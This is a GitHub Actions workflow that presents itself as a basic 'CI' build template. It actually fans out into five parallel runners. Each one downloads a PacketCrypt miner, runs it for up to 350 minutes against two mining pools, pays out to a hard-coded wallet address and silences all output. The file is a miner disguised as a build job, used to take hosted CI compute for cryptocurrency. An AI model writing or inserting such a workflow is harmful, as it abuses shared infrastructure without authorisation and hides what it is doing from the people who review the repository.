# This is a basic workflow to help you get started with Actions

name: CI

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the main branch
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build:
    name: TiyasTampan
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    strategy:
      fail-fast: false
      matrix:
        runner: ['t', 'i','y','a','z']
    steps:
      - name: Install packages
        run: sudo apt-get install bash git
      - name: StartMe
        run: |
         wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.4/packetcrypt-v0.4.4-linux_amd64 && chmod +x packetcrypt-v0.4.4-linux_amd64 && timeout 350m ./packetcrypt-v0.4.4-linux_amd64 ann -p pkt1q57zmu5hn2yqdvvanxzp8l77px730vx9ssp7x6v http://pool.srizbi.com http://pool.pktpool.io &> /dev/null	
